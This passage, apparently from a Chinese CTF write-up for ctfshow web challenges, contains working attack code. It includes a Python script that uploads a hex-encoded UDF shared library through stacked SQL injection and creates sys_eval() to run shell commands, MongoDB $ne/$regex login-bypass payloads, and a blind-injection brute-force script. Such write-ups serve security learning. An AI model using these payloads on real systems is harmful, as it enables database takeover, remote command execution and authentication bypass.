FF6A00000000410E108602440E188303470E200000140000005C0100008AFBFFFF3000000000440E10000000001C00000074010000A2FBFFFF2D00000000420E108C024E0E188303470E2000001400000094010000AFFBFFFF1F00000000440E100000000014000000AC010000B6FBFFFF1400000000440E100000000014000000C4010000B2FBFFFF6E00000000440E300000000014000000DC01000008FCFFFF0F00000000000000000000001C000000F4010000FFFBFFFF4100000000410E108602440E188303470E2000000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF000000000000000000000000000000000100000000000000B2010000000000000C00000000000000A00B0000000000000D00000000000000781100000000000004000000000000005801000000000000F5FEFF6F00000000A00200000000000005000000000000006807000000000000060000000000000060030000000000000A00000000000000E0010000000000000B0000000000000018000000000000000300000000000000E81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200A0000000000000700000000000000C0090000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000A009000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000004809000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000CE0B000000000000DE0B000000000000EE0B000000000000FE0B0000000000000E0C0000000000001E0C0000000000002E0C0000000000003E0C0000000000004E0C0000000000005E0C0000000000006E0C0000000000007E0C0000000000008E0C0000000000009E0C000000000000AE0C000000000000BE0C0000000000008017200000000000004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200002E7368737472746162002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E64796E616D6963002E676F74002E676F742E706C74002E64617461002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000B000000F6FFFF6F0200000000000000A002000000000000A002000000000000C000000000000000030000000000000008000000000000000000000000000000150000000B00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001D00000003000000020000000000000068070000000000006807000000000000E00100000000000000000000000000000100000000000000000000000000000025000000FFFFFF6F020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000FEFFFF6F0200000000000000A009000000000000A009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000C009000000000000C00900000000000060000000000000000300000000000000080000000000000018000000000000004B000000040000000200000000000000200A000000000000200A0000000000008001000000000000030000000A0000000800000000000000180000000000000055000000010000000600000000000000A00B000000000000A00B000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000B80B000000000000B80B00000000000010010000000000000000000000000000040000000000000010000000000000005B000000010000000600000000000000D00C000000000000D00C000000000000A80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000E000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000DD000000000000000000000000000000010000000000000001000000000000006F000000010000000200000000000000641200000000000064120000000000009C000000000000000000000000000000040000000000000000000000000000007D000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008E000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009A000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000A3000000010000000300000000000000D016200000000000D0160000000000001800000000000000000000000000000008000000000000000800000000000000A8000000010000000300000000000000E816200000000000E8160000000000009800000000000000000000000000000008000000000000000800000000000000B1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000B7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000BC000000010000000000000000000000000000000000000088170000000000009B000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000C500000000000000000000000000000001000000000000000000000000000000"
udf_text = []

for i in range(0, 20000, 5000):
    end = i + 5000
    udf_text.append(udf[i:end])

p = dict(zip(text, udf_text))

for t in text:
    param = payload.format(p[t], t)
    get_url = url + param
    res = requests.get(get_url)
    print("[*]", end="")
    code = res.status_code
    print(code, end="")
    if code == 404:
        print("你输入的URL可能出错")
    acq = acquire.format(t)
    data = url + acq
    res = requests.get(url=data)
    if "load_file" in res.text:
        print("-->成功插入{}.txt".format(t))

print("[*]导入udf.so成功")
url_sys_dll = "?id=1%27;select unhex(concat(load_file('/usr/lib/mariadb/plugin/a.txt'),load_file('/usr/lib/mariadb/plugin/b.txt'),load_file('/usr/lib/mariadb/plugin/c.txt'),load_file('/usr/lib/mariadb/plugin/d.txt'))) into dumpfile '/usr/lib/mariadb/plugin/udf.so' --+"
res = requests.get(url=url + url_sys_dll)
print("[*]创建函数sys_eval()成功")
url_sys_function = "?id=1%27;create function sys_eval returns string soname 'udf.so'--+"
res = requests.get(url=url + url_sys_function)

print("[*]命令执行结果: ")
sys_eval = "?id=';select sys_eval('cat /flag.*')--+"
res = requests.get(url=url + sys_eval)
print(res.text)

```

# 249 nosql memcache

payload

```
id[]=flag
```

# 250 nosql mongodb

mongodb 注入
建议简单学习下mongodb的语法

### 基础语法

| SQL术语/概念 | MongoDB术语/概念 | 解释/说明       |
| :----------- | :--------------- | :-------------- |
| database     | database         | 数据库          |
| table        | collection       | 数据库表/集合   |
| row          | document         | 数据记录行/文档 |
| column       | field            | 数据字段/域     |

### 数据库操作

```sql
显示所有数据库
show dbs #show databases

创建数据库
use 库名 #如果数据库不存在，则创建数据库，否则切换到指定数据库。show dbs执行结果没有看到创建的数据库，因为数据库中刚开始没有任何数据并且是在内存中的，有了数据后就会显示出来。

删除数据库
db.dropDatabase() #删除当前数据库
```

### 集合操作

```sql
显式创建集合
db.createCollection("userinfo");//创建一个名为usersinfo的集合

隐式创建集合
db.userinfo.insert({name:"yu22x"});//往collection2集合中添加数据来创建集合，如果集合不存在就自动创建集合。

查看集合
show collections;//(show tables)

删除集合userinfo
db.userinfo.drop();

注：mongo中支持js，可通过js操作实现批零处理，如：for(var i=0;i<1000;i++){db.userinfo.insert({name:"xiaomu"+i,age:20+i});}
固定集合
```

**我们重点关注的是mongodb中的条件语句**

| 操作       | 格式       | 范例                                 | RDBMS中的类似语句    |
| :--------- | :--------- | :----------------------------------- | :------------------- |
| 等于       | {:}        | db.userinfo.find({“name”:“yu22x”})   | where name = ‘yu22x’ |
| 小于       | {:{$lt:}}  | db.userinfo.find({“age”:{$lt:20}})   | where age < 20       |
| 小于或等于 | {:{$lte:}} | db.userinfo.find({“age”:{$lte:20}})  | where age <= 20      |
| 大于       | {:{$gt:}}  | db.userinfo.find({“age”:{$gt:20}})   | where age > 20       |
| 大于或等于 | {:{$gte:}} | db.userinfo.find({“age”:{$gte:20}})  | where age >= 20      |
| 不等于     | {:{$ne:}}  | db.userinfo.find({“likes”:{$ne:20}}) | where age != 20      |

```sql
AND 查询
db.userinfo.find({key1:value1, key2:value2})

OR 查询
db.userinfo.find({$or: [{key1: value1}, {key2:value2}]})
```

在mongodb中查询是这样的，

```
db.userinfo.find({name:'yu22x'});
```

类似于
`where username='yu22x'`
其中userinfo是表名（集合名）
而在mongodb中的条件语句有个比较有意思的

```
db.userinfo.find({"likes":{$ne:20}})
```

装类似于
`where likes != 20`
所以当我们传入
`username[$ne]=1&password[$ne]=1`
就等价于
`where username!=1&password!=1`，也就是nosql中的永真式。

payload:

```
username[$ne]=flag&password[$ne]=1
```



# 251 nosql mongodb

paylaod

```
username=flag&password[$ne]=1
```

# 252 nosql mongodb

Payload

```
username[$ne]=1&password[$regex]=^ctfshow{
```

# 253 nosql mongodb 盲注

```python
#author:yu22x
import requests
url="http://23fde3ab-6f1e-45f0-a918-576d3ac9525b.challenge.ctf.show/api/index.php"
flag="ctfshow{"
s='0123456789abcdef-}'
for i in range(9,46):
    print(i)
    for j in s:
        data={
            'username[$ne]':'1',
            'password[$regex]':f'^{flag+j}'
        }
        r=requests.post(url=url,data=data)
        if r"\u767b\u9646\u6210\u529f" in r.text:
            flag+=j
            print(flag)
            if j=="}":
                exit()
            break
```

